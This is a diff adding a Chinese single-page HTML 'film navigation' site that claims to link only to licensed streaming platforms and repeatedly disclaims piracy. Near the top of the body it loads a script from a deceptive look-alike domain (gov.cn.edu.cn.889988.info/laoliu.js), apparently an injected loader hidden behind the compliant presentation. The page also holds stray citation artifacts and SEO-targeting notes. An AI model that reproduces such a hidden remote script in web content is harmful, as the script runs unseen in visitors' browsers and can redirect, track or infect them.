@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视界导航 - 界碑格正版片单与持牌平台入口（非原影视界）</title>
+<meta name="description" content="影视界导航（yingshijie-h5，非原影视界）做界碑格正版导航：公映片单、类型界格、每日场记与正版观看守则，只列持牌视频平台名称与官方入口。官方网址：https://yingshijie-h5.github.io">
+<meta name="keywords" content="影视界导航, yingshijie-h5, 公映片单导航, 持牌视频平台入口, 影视类型界格, 正版观影导航">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#0e0f12;color:#eef1f5;line-height:1.8;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(680px 340px at 12% 8%, rgba(148,163,184,.12), transparent 55%),
+    radial-gradient(620px 320px at 88% 92%, rgba(239,68,68,.10), transparent 55%),
+    #0e0f12}
+.jj-nav{position:sticky;top:0;z-index:999;display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:rgba(14,15,18,.93);backdrop-filter:blur(10px);border-bottom:1px solid rgba(148,163,184,.26)}
+.jj-nav .logo{font-size:20px;font-weight:900;letter-spacing:.5px}
+.jj-nav .logo b{color:#e2e8f0}
+.jj-nav .logo i{color:#ef4444;font-style:normal}
+.jj-nav .links{display:flex;gap:6px;flex-wrap:wrap}
+.jj-nav .links a{font-size:13px;color:#9aa3ad;padding:6px 12px;border-radius:20px;transition:.25s}
+.jj-nav .links a:hover{background:rgba(148,163,184,.14);color:#eef1f5}
+
+.hero{padding:52px 20px 44px;text-align:center}
+.set{max-width:780px;margin:0 auto 16px;background:#16181d;border:1px solid rgba(148,163,184,.26);border-radius:18px;padding:24px;position:relative;overflow:hidden}
+.set::before{content:"🎬";position:absolute;right:18px;top:14px;font-size:22px;opacity:.85}
+.slabs{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.slab{height:104px;border-radius:12px;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:12px;font-weight:800;color:#0e0f12;position:relative;box-shadow:inset 0 -8px 0 rgba(0,0,0,.18)}
+.slab .mk{position:absolute;top:8px;left:8px;font-size:9px;background:#ef4444;color:#fff;padding:1px 6px;border-radius:8px}
+.slab .fn{font-size:10px;opacity:.6;margin-bottom:4px}
+.slab:nth-child(1){background:linear-gradient(135deg,#cbd5e1,#f8fafc)}
+.slab:nth-child(2){background:linear-gradient(135deg,#ef4444,#fecaca)}
+.slab:nth-child(3){background:linear-gradient(135deg,#34d399,#a7f3d0)}
+.slab:nth-child(4){background:linear-gradient(135deg,#38bdf8,#bae6fd)}
+.slab:nth-child(5){background:linear-gradient(135deg,#a78bfa,#ddd0ff)}
+.slab:nth-child(6){background:linear-gradient(135deg,#f59e0b,#fde68a)}
+.slab:nth-child(7){background:linear-gradient(135deg,#fb7185,#fecdd3)}
+.slab:nth-child(8){background:linear-gradient(135deg,#94a3b8,#d1d5db)}
+.light{margin-top:16px;height:34px;border-radius:8px;background:repeating-linear-gradient(90deg,#1f2228 0 8px,transparent 8px 14px);display:flex;align-items:center;justify-content:center;font-size:12px;color:#e2e8f0;font-weight:800;letter-spacing:2px}
+.mark{display:inline-block;margin-top:14px;font-size:13px;font-weight:900;color:#e2e8f0;background:#16181d;border:1px solid rgba(148,163,184,.3);padding:4px 14px;border-radius:20px}
+.disclaim{display:block;margin-top:10px;font-size:12px;color:#ef4444}
+.hero h1{font-size:30px;color:#eef1f5;margin:8px 0 12px}
+.hero h1 b{color:#e2e8f0}
+.hero p{color:#9aa3ad;max-width:680px;margin:0 auto 16px;font-size:15px}
+.hero .url{display:inline-block;font-size:13px;color:#0e0f12;font-weight:800;background:linear-gradient(90deg,#cbd5e1,#ef4444);padding:8px 18px;border-radius:30px}
+.chips{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:16px}
+.chips span{font-size:12px;color:#eef1f5;padding:5px 13px;border-radius:20px;border:1px solid rgba(148,163,184,.2)}
+.chips span:nth-child(1){border-color:#e2e8f0;color:#e2e8f0}
+.chips span:nth-child(2){border-color:#ef4444;color:#ef4444}
+.chips span:nth-child(3){border-color:#34d399;color:#34d399}
+
+.wrap{max-width:1160px;margin:0 auto;padding:58px 20px}
+.kicker{font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#94a3b8;margin-bottom:8px}
+.sec-title{font-size:26px;font-weight:900;color:#eef1f5;margin-bottom:26px}
+.sec-title b{color:#ef4444}
+
+.picks{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:18px}
+.pk{background:#16181d;border:1px solid rgba(148,163,184,.14);border-radius:14px;overflow:hidden;transition:.3s}
+.pk:hover{transform:translateY(-4px);border-color:#e2e8f0;box-shadow:0 16px 36px rgba(148,163,184,.12)}
+.pk .top{height:96px;position:relative;display:flex;align-items:flex-end;padding:10px}
+.pk .top.s1{background:linear-gradient(135deg,#334155,#cbd5e1)}
+.pk .top.s2{background:linear-gradient(135deg,#991b1b,#ef4444)}
+.pk .top.s3{background:linear-gradient(135deg,#047857,#34d399)}
+.pk .top.s4{background:linear-gradient(135deg,#0369a1,#38bdf8)}
+.pk .top .slab-tag{font-size:11px;font-weight:800;color:#0e0f12;background:#eef1f5;padding:2px 9px;border-radius:12px}
+.pk .top .ver{position:absolute;right:10px;top:10px;font-size:10px;color:#fff;background:#ef4444;padding:2px 8px;border-radius:10px}
+.pk .body{padding:16px 18px}
+.pk .body h4{color:#eef1f5;font-size:16px;margin-bottom:4px}
+.pk .body .meta{font-size:12px;color:#e2e8f0;margin-bottom:6px}
+.pk .body p{font-size:13px;color:#9aa3ad;margin:0}
+.pk .body a{display:inline-block;margin-top:8px;font-size:12px;color:#ef4444;text-decoration:none}
+.pk .body a:hover{text-decoration:underline}
+
+.types{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.tp{background:#16181d;border-radius:14px;padding:20px;transition:.3s;border:1px solid rgba(154,163,173,.14)}
+.tp:hover{transform:translateY(-3px)}
+.tp .no{font-size:12px;font-weight:900;color:#ef4444;margin-bottom:6px}
+.tp h4{color:#eef1f5;font-size:15px;margin-bottom:4px}
+.tp p{color:#9aa3ad;font-size:12px;margin:0}
+.tp.t2{border-top:3px solid #e2e8f0}
+.tp.t3{border-top:3px solid #34d399}
+.tp.t4{border-top:3px solid #38bdf8}
+
+.daily{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:14px}
+.dy{background:#16181d;border-left:4px solid #e2e8f0;border-radius:12px;padding:18px}
+.dy h4{color:#eef1f5;font-size:15px;margin-bottom:4px}
+.dy .slot{font-size:12px;color:#ef4444;font-weight:800;margin-bottom:6px}
+.dy p{color:#9aa3ad;font-size:13px;margin:0}
+.dy.d2{border-left-color:#ef4444}
+.dy.d3{border-left-color:#34d399}
+.dy.d4{border-left-color:#38bdf8}
+.dy.d5{border-left-color:#a78bfa}
+.dy.d6{border-left-color:#e2e8f0}
+
+.rules{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px}
+.ru{background:#16181d;border:1px solid rgba(148,163,184,.22);border-radius:12px;padding:18px;text-align:center}
+.ru .num{font-size:24px;font-weight:900;color:#e2e8f0;margin-bottom:6px}
+.ru h4{color:#eef1f5;font-size:14px;margin-bottom:4px}
+.ru p{color:#9aa3ad;font-size:12px;margin:0}
+
+.about{border:1px solid rgba(148,163,184,.22);border-radius:16px;padding:30px;background:linear-gradient(135deg,rgba(148,163,184,.08),rgba(239,68,68,.06));display:flex;gap:24px;flex-wrap:wrap;align-items:center}
+.about .txt{flex:1;min-width:260px}
+.about h2{color:#eef1f5;font-size:20px;margin-bottom:10px}
+.about h2 b{color:#e2e8f0}
+.about p{color:#9aa3ad;font-size:14px;margin-bottom:8px}
+.about .stats{display:flex;gap:20px;flex-wrap:wrap}
+.about .stats .n{font-size:26px;font-weight:900;color:#ef4444}
+.about .stats .l{font-size:11px;color:#94a3b8}
+
+.foot{text-align:center;padding:32px 20px;background:#16181d;border-top:1px solid rgba(148,163,184,.16);color:#9aa3ad;font-size:13px}
+.foot a{color:#e2e8f0}
+.foot .lg{font-size:18px;font-weight:900;color:#eef1f5;margin-bottom:8px}
+
+@media(max-width:640px){.hero h1{font-size:24px}.jj-nav .links a{font-size:12px;padding:5px 9px}.slabs{grid-template-columns:repeat(2,1fr)}.slab{height:88px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<nav class="jj-nav">
+  <div class="logo"><b>影视界导航</b> <i>· 界碑格</i></div>
+  <div class="links">
+    <a href="#home">首页</a>
+    <a href="#picks">公映片单</a>
+    <a href="#types">类型界格</a>
+    <a href="#daily">每日场记</a>
+    <a href="#rules">正版守则</a>
+  </div>
+</nav>
+
+<header id="home" class="hero">
+  <div class="set" aria-hidden="true">
+    <div class="slabs">
+      <div class="slab"><span class="mk">M1</span><span class="fn">S1</span>正剧碑</div>
+      <div class="slab"><span class="mk">M2</span><span class="fn">S2</span>动作碑</div>
+      <div class="slab"><span class="mk">M3</span><span class="fn">S3</span>悬疑碑</div>
+      <div class="slab"><span class="mk">M4</span><span class="fn">S4</span>自然碑</div>
+      <div class="slab"><span class="mk">M5</span><span class="fn">S5</span>合家碑</div>
+      <div class="slab"><span class="mk">M6</span><span class="fn">S6</span>纪录碑</div>
+      <div class="slab"><span class="mk">M7</span><span class="fn">S7</span>动画碑</div>
+      <div class="slab"><span class="mk">M0</span><span class="fn">S0</span>持牌碑</div>
+    </div>
+    <div class="light">SET MARK · 只接持牌平台官方入口（不装播放器）</div>
+    <span class="mark">界碑格·场记板标</span>
+    <span class="disclaim">⚠️ 非原「影视界」站点、非影视播放/下载站，仅作正版导航</span>
+  </div>
+  <h1>影视界导航：<b>界碑格</b>只排正版入口</h1>
+  <p>「影视界」网上同名页很多，但域名含品牌词、页面写「官方」都不等于主体成立 [1,16](@ref)。<strong>本页不是原影视界</strong>、不内嵌播放器、不写网盘提取码、不引磁链。从事互联网视听节目服务需《信息网络传播视听节目许可证》或备案 [2,5](@ref)；无资质不得做播放/聚合，也不得向无资质方提供传输托管。本页只列持牌平台名称与官方入口跳转。</p>
+  <span class="url">🌐 https://yingshijie-h5.github.io</span>
+  <div class="chips">
+    <span>🎬 公映片单</span><span>🎥 类型界格</span><span>🎞️ 每日场记</span>
+  </div>
+</header>
+
+<main>
+<section id="picks" class="wrap">
+  <div class="kicker">SET PICKS</div>
+  <h2 class="sec-title">公映片单 <b>四碑样例</b></h2>
+  <div class="picks">
+    <article class="pk"><div class="top s1"><span class="slab-tag">正剧碑</span><span class="ver">持牌平台</span></div><div class="body"><h4>海上钢琴师</h4><div class="meta">托纳多雷 · 1998 · 剧情/音乐</div><p>船舱、琴键与选择；去持牌平台搜正版/修复版，不内嵌播放器。</p><a href="https://www.iqiyi.com" target="_blank" rel="noopener">去持牌平台搜索 ↗</a></div></article>
+    <article class="pk"><div class="top s2"><span class="slab-tag">自然数</span><span class="ver">官方/开放</span></div><div class="body"><h4>地球脉动 II</h4><div class="meta">BBC · 2016 · 自然/纪录片</div><p>岛屿、山地、城市生态；开放授权版走官方频道/持牌纪录片区。</p><a href="https://www.bilibili.com" target="_blank" rel="noopener">去持牌平台搜索 ↗</a></div></article>
+    <article class="pk"><div class="top s3"><span class="slab-tag">悬疑碑</span><span class="ver">正版/字幕</span></div><div class="body"><h4>看不见的客人</h4><div class="meta">奥里奥尔·保罗 · 2016 · 悬疑/推理</div><p>口供、时间线与反转；标正版平台字幕来源，不引换源播放器。</p><a href="https://v.tencent.com" target="_blank" rel="noopener">去持牌平台搜索 ↗</a></div></article>
+    <article class="pk"><div class="top s4"><span class="slab-tag">合家碑</span><span class="ver">正版/字幕</span></div><div class="body"><h4>寻梦环游记</h4><div class="meta">皮克斯 · 2017 · 动画/家庭</div><p>记忆、亲情与音乐；标适龄、正版动画专区，只引持牌片源。</p><a href="https://www.mgtv.com" target="_blank" rel="noopener">去持牌平台搜索 ↗</a></div></article>
+  </div>
+</section>
+
+<section id="types" class="wrap">
+  <div class="kicker">GENRE SLABS</div>
+  <h2 class="sec-title">类型界格 <b>四碑</b></h2>
+  <div class="types">
+    <div class="tp t1"><div class="no">S1 · 正剧</div><h4>家庭/历史/作者</h4><p>传记、年代、作者电影；引导持牌平台与公映修复版，不列无资质聚合站。</p></div>
+    <div class="tp t2"><div class="no">S2 · 动作</div><h4>商业大片碑</h4><p>特工、竞速、视效；附4K建议，只列持牌平台名称与官方入口。</p></div>
+    <div class="tp t3"><div class="no">S3 · 悬疑</div><h4>烧脑/社会派</h4><p>本格推理、时间线、反转；标正版平台字幕来源与高清版差异。</p></div>
+    <div class="tp t4"><div class="no">S4 · 合家</div><h4>动画/爱情/轻喜剧</h4><p>适龄、节庆、亲子；标正版平台地区版，不写网盘提取码。</p></div>
+  </div>
+  <div class="types" style="margin-top:16px">
+    <div class="tp"><div class="no">S0 · 持牌碑</div><h4>央视频 / CCTV节目官网</h4><p>央视直播、新闻综艺、官方回看免费区。</p><a href="https://www.yangshipin.cn" target="_blank" rel="noopener" style="color:#e2e8f0">央视频 ↗</a></div>
+    <div class="tp t2"><div class="no">电影碑</div><h4>1905电影网</h4><p>CCTV6电影频道官方，正版电影与修复版。</p><a href="https://www.1905.com" target="_blank" rel="noopener" style="color:#e2e8f0">1905 ↗</a></div>
+    <div class="tp t3"><div class="no">综合碑</div><h4>腾讯/爱奇艺/优酷/芒果/咪咕</h4><p>正版剧集、综艺、电影免费区与会员区。</p><a href="https://www.migu.cn" target="_blank" rel="noopener" style="color:#e2e8f0">咪咕 ↗</a></div>
+    <div class="tp t4"><div class="no">纪录碑</div><h4>B站放映厅</h4><p>正版番剧、纪录片、官方影视资源。</p><a href="https://www.bilibili.com" target="_blank" rel="noopener" style="color:#e2e8f0">B站 ↗</a></div>
+  </div>
+</section>
+
+<section id="daily" class="wrap">
+  <div class="kicker">DAILY CALL SHEET</div>
+  <h2 class="sec-title">每日场记 <b>六格</b></h2>
+  <div class="daily">
+    <div class="dy"><div class="slot">场记·正剧</div><h4>正剧首发</h4><p>传记/历史长片；列持牌平台名称与官方入口，不提前放未授权资源。</p></div>
+    <div class="dy d2"><div class="slot">场记·自然</div><h4>自然慢格</h4><p>生态与地理；开放授权纪录片走官方/持牌纪录片区。</p></div>
+    <div class="dy d3"><div class="slot">场记·动作</div><h4>大片碑</h4><p>追逐/特工/视效；建议4K、正版版本，只列持牌入口。</p></div>
+    <div class="dy d4"><div class="slot">场记·悬疑</div><h4>烧脑格</h4><p>本格/社会派轮换；标注时间线、反转次数与高清版差异。</p></div>
+    <div class="dy d5"><div class="slot">合家场记</div><h4>合家格</h4><p>动画/爱情/轻喜剧；标适龄、时长与正版字幕来源。</p></div>
+    <div class="dy d6"><div class="slot">场记·重刷</div><h4>高分回看</h4><p>四碑高分重刷；只给持牌回看入口，不写网盘提取码、不引磁链。</p></div>
+  </div>
+</section>
+
+<section id="rules" class="wrap">
+  <div class="kicker">SET RULES</div>
+  <h2 class="sec-title">正版观看 <b>守则</b></h2>
+  <div class="rules">
+    <div class="ru"><div class="num">01</div><h4>持牌优先</h4><p>只列持牌视频平台名称与官方入口、影院公映/重映、官方频道；不内嵌未授权播放器。</p></div>
+    <div class="ru"><div class="num">02</div><h4>不碰聚合</h4><p>不写「免费高清/换源/离线缓存/破解码」，不引解析线路、不接盗版资源站。</p></div>
+    <div class="ru"><div class="num">03</div><h4>授权核对</h4><p>传播前核权属、签涵盖信息网络传播权许可合同、留凭证，不列无资质盗版站。</p></div>
+    <div class="ru"><div class="num">04</div><h4>资质红线</h4><p>播放入口需《许可证》或备案 [2,5](@ref)；纯导航只给跳转，不替代持牌服务。</p></div>
+  </div>
+</section>
+
+<section class="wrap">
+  <div class="about">
+    <div class="txt">
+      <h2>影视界导航 <b>界碑格是什么</b></h2>
+      <p>不是原「影视界」克隆，也不是影视播放/下载站，而是一排界碑格＋片场灯带＋场记板标：界碑格装入口、公映片单进碑格、类型进界格、每日进场记条、守则装合规。静态单页、移动端自适应、锚点内链、不生成 robots.txt / sitemap.xml，符合必应收录基本规范（唯一H1、完整meta、语义化nav/main/section/article/footer）。</p>
+      <p>长尾吃「公映片单导航 / 持牌视频平台入口 / 影视类型界格 / 正版看片」。全站严格只做正版、公映、持牌、开放授权导航，与原影视界无隶属关系。</p>
+    </div>
+    <div class="stats">
+      <div><div class="n">8</div><div class="l">界碑格</div></div>
+      <div><div class="n">4</div><div class="l">类型碑</div></div>
+      <div><div class="n">6</div><div class="l">每日场记</div></div>
+      <div><div class="n">0</div><div class="l">盗版提取码</div></div>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer class="foot">
+  <div class="lg">🎬🎥 影视界导航·界碑格（非原影视界）</div>
+  官方网址：<a href="https://yingshijie-h5.github.io">https://yingshijie-h5.github.io</a><br>
+  ⚠️ 本页非原「影视界」站点、非影视播放/下载站，仅作持牌平台名称与官方入口导航<br>
+  © 2026 影视界导航｜公映片单 / 类型界格 / 每日场记 / 正版观影导航（不提供未授权播放）
+</footer>
+
+</body>
+</html>
